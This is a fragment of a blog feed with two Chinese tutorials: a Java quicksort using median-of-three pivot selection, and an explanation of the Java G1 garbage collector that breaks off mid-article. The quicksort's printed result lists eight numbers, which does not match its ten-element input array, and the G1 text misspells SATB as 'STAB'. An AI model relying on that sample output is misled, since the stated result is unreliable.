        <content type="html"><![CDATA[<h1 id="快速排序-三数取中法"><a href="#快速排序-三数取中法" class="headerlink" title="快速排序-三数取中法"></a>快速排序-三数取中法</h1><blockquote><p>快速排序由C. A. R. Hoare在1962年提出。它的基本思想是：通过一趟排序将要排序的数据分割成独立的两部分，其中一部分的所有数据都比另外一部分的所有数据都要小，然后再按此方法对这两部分数据分别进行快速排序，整个排序过程可以<a href="http://baike.baidu.com/view/96473.htm" target="_blank" rel="noopener">递归</a>进行，以此达到整个数据变成有序<a href="http://baike.baidu.com/subview/71968/12546268.htm" target="_blank" rel="noopener">序列</a></p></blockquote><h1 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a><strong>基本步骤</strong></h1><p><strong>三数取中</strong></p><p>　　在快排的过程中，每一次我们要取一个元素作为枢纽值，以这个数字来将序列划分为两部分。在此我们采用三数取中法，也就是取左端、中间、右端三个数，然后进行排序，将中间数作为枢纽值。</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/排序算法/1024555-20170108124741566-1283178705.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/排序算法/1024555-20170108124741566-1283178705.png" alt="img"></a></p><p>　<strong>根据枢纽值进行分割</strong></p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/排序算法/1024555-20170108162758159-793891242.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/排序算法/1024555-20170108162758159-793891242.png" alt="img"></a></p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/排序算法/1024555-20170108162855675-777137351.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/排序算法/1024555-20170108162855675-777137351.png" alt="img"></a></p><h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> sortdemo<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Arrays<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * Created by chengxiao on 2016/12/14. * 快速排序 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">QuickSort</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token function">quickSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> arr<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"排序结果："</span> <span class="token operator">+</span> Arrays<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * @param arr     * @param left  左指针     * @param right 右指针     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">quickSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> left<span class="token punctuation">,</span> <span class="token keyword">int</span> right<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">&lt;</span> right<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//获取枢纽值，并将其放在当前待处理序列末尾</span>            <span class="token function">dealPivot</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//枢纽值被放在序列末尾</span>            <span class="token keyword">int</span> pivot <span class="token operator">=</span> right <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//左指针</span>            <span class="token keyword">int</span> i <span class="token operator">=</span> left<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//右指针</span>            <span class="token keyword">int</span> j <span class="token operator">=</span> right <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span><span class="token operator">++</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> arr<span class="token punctuation">[</span>pivot<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token punctuation">}</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">></span> left <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span><span class="token operator">--</span>j<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>pivot<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> right<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> i<span class="token punctuation">,</span> right <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token function">quickSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> left<span class="token punctuation">,</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">quickSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 处理枢纽值     *     * @param arr     * @param left     * @param right     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">dealPivot</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> left<span class="token punctuation">,</span> <span class="token keyword">int</span> right<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> left<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>right<span class="token punctuation">]</span> <span class="token operator">&lt;</span> arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> right<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> right <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 交换元素通用处理     *     * @param arr     * @param a     * @param b     */</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> temp <span class="token operator">=</span> arr<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">;</span>        arr<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">;</span>        arr<span class="token punctuation">[</span>b<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> </code></pre><p>排序结果</p><pre><code>排序结果：[1, 2, 3, 4, 5, 6, 7, 8]</code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>　　快速排序是一种交换类的排序，它同样是分治法的经典体现。在一趟排序中将待排序的序列分割成两组，其中一部分记录的关键字均小于另一部分。然后分别对这两组继续进行排序，以使整个序列有序。在分割的过程中，枢纽值的选择至关重要，本文采取了三位取中法，可以很大程度上避免分组”一边倒”的情况。快速排序平均时间复杂度也为O(nlogn)级。</p><p>本文转载自：<a href="https://www.cnblogs.com/chengxiao/p/6262208.html" target="_blank" rel="noopener">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 排序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入理解Java G1垃圾收集器</title>
      <link href="/2019/01/16/java/java-xu-ni-ji/shen-ru-li-jie-java-g1-la-ji-shou-ji-qi/"/>
      <url>/2019/01/16/java/java-xu-ni-ji/shen-ru-li-jie-java-g1-la-ji-shou-ji-qi/</url>
      
        <content type="html"><![CDATA[<h1 id="深入理解Java-G1垃圾收集器"><a href="#深入理解Java-G1垃圾收集器" class="headerlink" title="深入理解Java G1垃圾收集器"></a>深入理解Java G1垃圾收集器</h1><p>本文首先简单介绍了垃圾收集的常见方式，然后再分析了G1收集器的收集原理，相比其他垃圾收集器的优势，最后给出了一些调优实践。</p><h2 id="一-什么是垃圾回收"><a href="#一-什么是垃圾回收" class="headerlink" title="一 什么是垃圾回收"></a>一 什么是垃圾回收</h2><p>首先，在了解G1之前，我们需要清楚的知道，垃圾回收是什么？简单的说垃圾回收就是回收内存中不再使用的对象。</p><p>垃圾回收的基本步骤</p><p>回收的步骤有2步：</p><ol><li>查找内存中不再使用的对象</li><li>释放这些对象占用的内存</li></ol><h3 id="1-查找内存中不再使用的对象"><a href="#1-查找内存中不再使用的对象" class="headerlink" title="1,查找内存中不再使用的对象"></a><strong>1,查找内存中不再使用的对象</strong></h3><p>那么问题来了，如何判断哪些对象不再被使用呢？我们也有2个方法：</p><h4 id="1-引用计数法"><a href="#1-引用计数法" class="headerlink" title="1. 引用计数法"></a>1. 引用计数法</h4><p>引用计数法就是如果一个对象没有被任何引用指向，则可视之为垃圾。这种方法的缺点就是不能检测到环的存在。</p><h4 id="2-根搜索算法"><a href="#2-根搜索算法" class="headerlink" title="2.根搜索算法"></a>2.根搜索算法</h4><p>根搜索算法的基本思路就是通过一系列名为”GC Roots”的对象作为起始点，从这些节点开始向下搜索，搜索所走过的路径称为引用链(Reference Chain)，当一个对象到GC Roots没有任何引用链相连时，则证明此对象是不可用的。</p><p>现在我们已经知道如何找出垃圾对象了，如何把这些对象清理掉呢？</p><h3 id="2-释放这些对象占用的内存"><a href="#2-释放这些对象占用的内存" class="headerlink" title="2. 释放这些对象占用的内存"></a><strong>2. 释放这些对象占用的内存</strong></h3><p>常见的方式有复制或者直接清理，但是直接清理会存在内存碎片，于是就会产生了清理再压缩的方式。</p><p>总得来说就产生了三种类型的回收算法。</p><h4 id="1-标记-复制"><a href="#1-标记-复制" class="headerlink" title="1.标记-复制"></a>1.标记-复制</h4><p>它将可用内存容量划分为大小相等的两块，每次只使用其中的一块。当这一块用完之后，就将还存活的对象复制到另外一块上面，然后在把已使用过的内存空间一次理掉。它的优点是实现简单，效率高，不会存在内存碎片。缺点就是需要2倍的内存来管理。</p><h4 id="2-标记-清理"><a href="#2-标记-清理" class="headerlink" title="2.标记-清理"></a>2.标记-清理</h4><p>标记清除算法分为“标记”和“清除”两个阶段：首先标记出需要回收的对象，标记完成之后统一清除对象。它的优点是效率高，缺点是容易产生内存碎片。</p><h4 id="3-标记-整理"><a href="#3-标记-整理" class="headerlink" title="3.标记-整理"></a>3.标记-整理</h4><p>标记操作和“标记-清理”算法一致，后续操作不只是直接清理对象，而是在清理无用对象完成后让所有 存活的对象都向一端移动，并更新引用其对象的指针。因为要移动对象，所以它的效率要比“标记-清理”效率低，但是不会产生内存碎片。</p><h3 id="基于分代的假设"><a href="#基于分代的假设" class="headerlink" title="基于分代的假设"></a><strong>基于分代的假设</strong></h3><p>由于对象的存活时间有长有短，所以对于存活时间长的对象，减少被gc的次数可以避免不必要的开销。这样我们就把内存分成新生代和老年代，新生代存放刚创建的和存活时间比较短的对象，老年代存放存活时间比较长的对象。这样每次仅仅清理年轻代，老年代仅在必要时时再做清理可以极大的提高GC效率，节省GC时间。</p><h3 id="java垃圾收集器的历史"><a href="#java垃圾收集器的历史" class="headerlink" title="java垃圾收集器的历史"></a><strong>java垃圾收集器的历史</strong></h3><h4 id="第一阶段，Serial（串行）收集器"><a href="#第一阶段，Serial（串行）收集器" class="headerlink" title="第一阶段，Serial（串行）收集器"></a>第一阶段，Serial（串行）收集器</h4><p>在jdk1.3.1之前，java虚拟机仅仅能使用Serial收集器。 Serial收集器是一个单线程的收集器，但它的“单线程”的意义并不仅仅是说明它只会使用一个CPU或一条收集线程去完成垃圾收集工作，更重要的是在它进行垃圾收集时，必须暂停其他所有的工作线程，直到它收集结束。</p><p>PS：开启Serial收集器的方式</p><blockquote><p>-XX:+UseSerialGC</p></blockquote><h4 id="第二阶段，Parallel（并行）收集器"><a href="#第二阶段，Parallel（并行）收集器" class="headerlink" title="第二阶段，Parallel（并行）收集器"></a>第二阶段，Parallel（并行）收集器</h4><p>Parallel收集器也称吞吐量收集器，相比Serial收集器，Parallel最主要的优势在于使用多线程去完成垃圾清理工作，这样可以充分利用多核的特性，大幅降低gc时间。</p><p>PS:开启Parallel收集器的方式</p><blockquote><p>-XX:+UseParallelGC -XX:+UseParallelOldGC</p></blockquote><h4 id="第三阶段，CMS（并发）收集器"><a href="#第三阶段，CMS（并发）收集器" class="headerlink" title="第三阶段，CMS（并发）收集器"></a>第三阶段，CMS（并发）收集器</h4><p>CMS收集器在Minor GC时会暂停所有的应用线程，并以多线程的方式进行垃圾回收。在Full GC时不再暂停应用线程，而是使用若干个后台线程定期的对老年代空间进行扫描，及时回收其中不再使用的对象。</p><p>PS:开启CMS收集器的方式</p><blockquote><p>-XX:+UseParNewGC -XX:+UseConcMarkSweepGC</p></blockquote><h4 id="第四阶段，G1（并发）收集器"><a href="#第四阶段，G1（并发）收集器" class="headerlink" title="第四阶段，G1（并发）收集器"></a>第四阶段，G1（并发）收集器</h4><p>G1收集器（或者垃圾优先收集器）的设计初衷是为了尽量缩短处理超大堆（大于4GB）时产生的停顿。相对于CMS的优势而言是内存碎片的产生率大大降低。</p><p>PS:开启G1收集器的方式</p><blockquote><p>-XX:+UseG1GC</p></blockquote><h2 id="二-了解G1"><a href="#二-了解G1" class="headerlink" title="二 了解G1"></a><strong>二 了解G1</strong></h2><p>G1的第一篇paper（附录1）发表于2004年，在2012年才在jdk1.7u4中可用。oracle官方计划在jdk9中将G1变成默认的垃圾收集器，以替代CMS。为何oracle要极力推荐G1呢，G1有哪些优点？</p><h3 id="首先，G1的设计原则就是简单可行的性能调优"><a href="#首先，G1的设计原则就是简单可行的性能调优" class="headerlink" title="首先，G1的设计原则就是简单可行的性能调优"></a><strong>首先，G1的设计原则就是简单可行的性能调优</strong></h3><p>开发人员仅仅需要声明以下参数即可：</p><blockquote><p>-XX:+UseG1GC -Xmx32g -XX:MaxGCPauseMillis=200</p></blockquote><p>其中-XX:+UseG1GC为开启G1垃圾收集器，-Xmx32g 设计堆内存的最大内存为32G，-XX:MaxGCPauseMillis=200设置GC的最大暂停时间为200ms。如果我们需要调优，在内存大小一定的情况下，我们只需要修改最大暂停时间即可。</p><h3 id="其次，G1将新生代，老年代的物理空间划分取消了。"><a href="#其次，G1将新生代，老年代的物理空间划分取消了。" class="headerlink" title="其次，G1将新生代，老年代的物理空间划分取消了。"></a><strong>其次，G1将新生代，老年代的物理空间划分取消了。</strong></h3><p>这样我们再也不用单独的空间对每个代进行设置了，不用担心每个代内存是否足够。</p><p><a href="http://jbcdn2.b0.upaiyun.com/2016/12/3d37bfb7e94c81bd23c7fda6b7d87d59.png" target="_blank" rel="noopener"><img src="http://jbcdn2.b0.upaiyun.com/2016/12/3d37bfb7e94c81bd23c7fda6b7d87d59.png" alt="1"></a></p><p>取而代之的是，G1算法将堆划分为若干个区域（Region），它仍然属于分代收集器。不过，这些区域的一部分包含新生代，新生代的垃圾收集依然采用暂停所有应用线程的方式，将存活对象拷贝到老年代或者Survivor空间。老年代也分成很多区域，G1收集器通过将对象从一个区域复制到另外一个区域，完成了清理工作。这就意味着，在正常的处理过程中，G1完成了堆的压缩（至少是部分堆的压缩），这样也就不会有cms内存碎片问题的存在了。</p><p><a href="http://jbcdn2.b0.upaiyun.com/2016/12/02d155395a44f40be1b7e9f634939cb0.png" target="_blank" rel="noopener"><img src="http://jbcdn2.b0.upaiyun.com/2016/12/02d155395a44f40be1b7e9f634939cb0.png" alt="2"></a></p><p>在G1中，还有一种特殊的区域，叫Humongous区域。 如果一个对象占用的空间超过了分区容量50%以上，G1收集器就认为这是一个巨型对象。这些巨型对象，默认直接会被分配在年老代，但是如果它是一个短期存在的巨型对象，就会对垃圾收集器造成负面影响。为了解决这个问题，G1划分了一个Humongous区，它用来专门存放巨型对象。如果一个H区装不下一个巨型对象，那么G1会寻找连续的H分区来存储。为了能找到连续的H区，有时候不得不启动Full GC。</p><p>PS：在java 8中，持久代也移动到了普通的堆内存空间中，改为元空间。</p><h3 id="对象分配策略"><a href="#对象分配策略" class="headerlink" title="对象分配策略"></a><strong>对象分配策略</strong></h3><p>说起大对象的分配，我们不得不谈谈对象的分配策略。它分为3个阶段：</p><ol><li>TLAB(Thread Local Allocation Buffer)线程本地分配缓冲区</li><li>Eden区中分配</li><li>Humongous区分配</li></ol><p>TLAB为线程本地分配缓冲区，它的目的为了使对象尽可能快的分配出来。如果对象在一个共享的空间中分配，我们需要采用一些同步机制来管理这些空间内的空闲空间指针。在Eden空间中，每一个线程都有一个固定的分区用于分配对象，即一个TLAB。分配对象时，线程之间不再需要进行任何的同步。</p><p>对TLAB空间中无法分配的对象，JVM会尝试在Eden空间中进行分配。如果Eden空间无法容纳该对象，就只能在老年代中进行分配空间。</p><p>最后，G1提供了两种GC模式，Young GC和Mixed GC，两种都是Stop The World(STW)的。下面我们将分别介绍一下这2种模式。</p><h2 id="三-G1-Young-GC"><a href="#三-G1-Young-GC" class="headerlink" title="三 G1 Young GC"></a><strong>三 G1 Young GC</strong></h2><p>Young GC主要是对Eden区进行GC，它在Eden空间耗尽时会被触发。在这种情况下，Eden空间的数据移动到Survivor空间中，如果Survivor空间不够，Eden空间的部分数据会直接晋升到年老代空间。Survivor区的数据移动到新的Survivor区中，也有部分数据晋升到老年代空间中。最终Eden空间的数据为空，GC停止工作，应用线程继续执行。</p><p><a href="http://jbcdn2.b0.upaiyun.com/2016/12/50877d4b41c80010b1f131de5759b689.png" target="_blank" rel="noopener"><img src="http://jbcdn2.b0.upaiyun.com/2016/12/50877d4b41c80010b1f131de5759b689.png" alt="3"></a></p><p><a href="http://jbcdn2.b0.upaiyun.com/2016/12/a245f9decda81cbf12f69412d38f3177.png" target="_blank" rel="noopener"><img src="http://jbcdn2.b0.upaiyun.com/2016/12/a245f9decda81cbf12f69412d38f3177.png" alt="4"></a></p><p>这时，我们需要考虑一个问题，如果仅仅GC 新生代对象，我们如何找到所有的根对象呢？ 老年代的所有对象都是根么？那这样扫描下来会耗费大量的时间。于是，G1引进了RSet的概念。它的全称是Remembered Set，作用是跟踪指向某个heap区内的对象引用。</p><p><a href="http://jbcdn2.b0.upaiyun.com/2016/12/bd7d9f4a8e43312cb189863a568c4630.png" target="_blank" rel="noopener"><img src="http://jbcdn2.b0.upaiyun.com/2016/12/bd7d9f4a8e43312cb189863a568c4630.png" alt="5"></a></p><p>在CMS中，也有RSet的概念，在老年代中有一块区域用来记录指向新生代的引用。这是一种point-out，在进行Young GC时，扫描根时，仅仅需要扫描这一块区域，而不需要扫描整个老年代。</p><p>但在G1中，并没有使用point-out，这是由于一个分区太小，分区数量太多，如果是用point-out的话，会造成大量的扫描浪费，有些根本不需要GC的分区引用也扫描了。于是G1中使用point-in来解决。point-in的意思是哪些分区引用了当前分区中的对象。这样，仅仅将这些对象当做根来扫描就避免了无效的扫描。由于新生代有多个，那么我们需要在新生代之间记录引用吗？这是不必要的，原因在于每次GC时，所有新生代都会被扫描，所以只需要记录老年代到新生代之间的引用即可。</p><p>需要注意的是，如果引用的对象很多，赋值器需要对每个引用做处理，赋值器开销会很大，为了解决赋值器开销这个问题，在G1 中又引入了另外一个概念，卡表（Card Table）。一个Card Table将一个分区在逻辑上划分为固定大小的连续区域，每个区域称之为卡。卡通常较小，介于128到512字节之间。Card Table通常为字节数组，由Card的索引（即数组下标）来标识每个分区的空间地址。默认情况下，每个卡都未被引用。当一个地址空间被引用时，这个地址空间对应的数组索引的值被标记为”0″，即标记为脏被引用，此外RSet也将这个数组下标记录下来。一般情况下，这个RSet其实是一个Hash Table，Key是别的Region的起始地址，Value是一个集合，里面的元素是Card Table的Index。</p><p>Young GC 阶段：</p><ul><li>阶段1：根扫描<br>静态和本地对象被扫描</li><li>阶段2：更新RS<br>处理dirty card队列更新RS</li><li>阶段3：处理RS<br>检测从年轻代指向年老代的对象</li><li>阶段4：对象拷贝<br>拷贝存活的对象到survivor/old区域</li><li>阶段5：处理引用队列<br>软引用，弱引用，虚引用处理</li></ul><h2 id="四-G1-Mix-GC"><a href="#四-G1-Mix-GC" class="headerlink" title="四 G1 Mix GC"></a><strong>四 G1 Mix GC</strong></h2><p>Mix GC不仅进行正常的新生代垃圾收集，同时也回收部分后台扫描线程标记的老年代分区。</p><p>它的GC步骤分2步：</p><ol><li>全局并发标记（global concurrent marking）</li><li>拷贝存活对象（evacuation）</li></ol><p>在进行Mix GC之前，会先进行global concurrent marking（全局并发标记）。 global concurrent marking的执行过程是怎样的呢？</p><p>在G1 GC中，它主要是为Mixed GC提供标记服务的，并不是一次GC过程的一个必须环节。global concurrent marking的执行过程分为五个步骤：</p><ul><li>初始标记（initial mark，STW）<br>在此阶段，G1 GC 对根进行标记。该阶段与常规的 (STW) 年轻代垃圾回收密切相关。</li><li>根区域扫描（root region scan）<br>G1 GC 在初始标记的存活区扫描对老年代的引用，并标记被引用的对象。该阶段与应用程序（非 STW）同时运行，并且只有完成该阶段后，才能开始下一次 STW 年轻代垃圾回收。</li><li>并发标记（Concurrent Marking）<br>G1 GC 在整个堆中查找可访问的（存活的）对象。该阶段与应用程序同时运行，可以被 STW 年轻代垃圾回收中断</li><li>最终标记（Remark，STW）<br>该阶段是 STW 回收，帮助完成标记周期。G1 GC 清空 SATB 缓冲区，跟踪未被访问的存活对象，并执行引用处理。</li><li>清除垃圾（Cleanup，STW）<br>在这个最后阶段，G1 GC 执行统计和 RSet 净化的 STW 操作。在统计期间，G1 GC 会识别完全空闲的区域和可供进行混合垃圾回收的区域。清理阶段在将空白区域重置并返回到空闲列表时为部分并发。</li></ul><h3 id="三色标记算法"><a href="#三色标记算法" class="headerlink" title="三色标记算法"></a><strong>三色标记算法</strong></h3><p>提到并发标记，我们不得不了解并发标记的三色标记算法。它是描述追踪式回收器的一种有用的方法，利用它可以推演回收器的正确性。 首先，我们将对象分成三种类型的。</p><ul><li>黑色:根对象，或者该对象与它的子对象都被扫描</li><li>灰色:对象本身被扫描,但还没扫描完该对象中的子对象</li><li>白色:未被扫描对象，扫描完成所有对象之后，最终为白色的为不可达对象，即垃圾对象</li></ul><p>当GC开始扫描对象时，按照如下图步骤进行对象的扫描：</p><p>根对象被置为黑色，子对象被置为灰色。</p><p><a href="http://jbcdn2.b0.upaiyun.com/2016/12/8efbc44ba3b845e6086a83377e912bb9.png" target="_blank" rel="noopener"><img src="http://jbcdn2.b0.upaiyun.com/2016/12/8efbc44ba3b845e6086a83377e912bb9.png" alt="6"></a></p><p>继续由灰色遍历,将已扫描了子对象的对象置为黑色。</p><p><a href="http://jbcdn2.b0.upaiyun.com/2016/12/f56ab01de2138dc3b4a4bb3d50f54594.png" target="_blank" rel="noopener"><img src="http://jbcdn2.b0.upaiyun.com/2016/12/f56ab01de2138dc3b4a4bb3d50f54594.png" alt="7"></a></p><p>遍历了所有可达的对象后，所有可达的对象都变成了黑色。不可达的对象即为白色，需要被清理。<br><a href="http://jbcdn2.b0.upaiyun.com/2016/12/c4f581fd4a8877375d54a55e4af27841.png" target="_blank" rel="noopener"><img src="http://jbcdn2.b0.upaiyun.com/2016/12/c4f581fd4a8877375d54a55e4af27841.png" alt="8"></a></p><p>这看起来很美好，但是如果在标记过程中，应用程序也在运行，那么对象的指针就有可能改变。这样的话，我们就会遇到一个问题：对象丢失问题</p><p>我们看下面一种情况，当垃圾收集器扫描到下面情况时：</p><p><a href="http://jbcdn2.b0.upaiyun.com/2016/12/5dd0686b02e1898ec1a987c2e1571548.png" target="_blank" rel="noopener"><img src="http://jbcdn2.b0.upaiyun.com/2016/12/5dd0686b02e1898ec1a987c2e1571548.png" alt="9"></a></p><p>这时候应用程序执行了以下操作：</p><blockquote><p>A.c=C<br>B.c=null</p></blockquote><p>这样，对象的状态图变成如下情形：</p><p><a href="http://jbcdn2.b0.upaiyun.com/2016/12/78ad6fbc199fca514a5336b2167bd8f7.png" target="_blank" rel="noopener"><img src="http://jbcdn2.b0.upaiyun.com/2016/12/78ad6fbc199fca514a5336b2167bd8f7.png" alt="10"></a></p><p>这时候垃圾收集器再标记扫描的时候就会下图成这样：</p><p><a href="http://jbcdn2.b0.upaiyun.com/2016/12/f4765bacd1941792df63c6296ad12e3a.png" target="_blank" rel="noopener"><img src="http://jbcdn2.b0.upaiyun.com/2016/12/f4765bacd1941792df63c6296ad12e3a.png" alt="11"></a></p><p>很显然，此时C是白色，被认为是垃圾需要清理掉，显然这是不合理的。那么我们如何保证应用程序在运行的时候，GC标记的对象不丢失呢？有如下2中可行的方式：</p><ol><li>在插入的时候记录对象</li><li>在删除的时候记录对象</li></ol><p>刚好这对应CMS和G1的2种不同实现方式：</p><p>在CMS采用的是增量更新（Incremental update），只要在写屏障（write barrier）里发现要有一个白对象的引用被赋值到一个黑对象 的字段里，那就把这个白对象变成灰色的。即插入的时候记录下来。</p><p>在G1中，使用的是STAB（snapshot-at-the-beginning）的方式，删除的时候记录所有的对象，它有3个步骤：</p><p>1，在开始标记的时候生成一个快照图标记存活对象</p><p>2，在并发标记的时候所有被改变的对象入队（在write barrier里把所有旧的引用所指向的对象都变成非白的）</p><p>3，可能存在游离的垃圾，将在下次被收集</p><p>这样，G1到现在可以知道哪些老的分区可回收垃圾最多。 当全局并发标记完成后，在某个时刻，就开始了Mix GC。这些垃圾回收被称作“混合式”是因为他们不仅仅进行正常的新生代垃圾收集，同时也回收部分后台扫描线程标记的分区。混合式垃圾收集如下图：</p><p><a href="http://jbcdn2.b0.upaiyun.com/2016/12/0860c63775ccbc265095b5a844f0d381.png" target="_blank" rel="noopener"><img 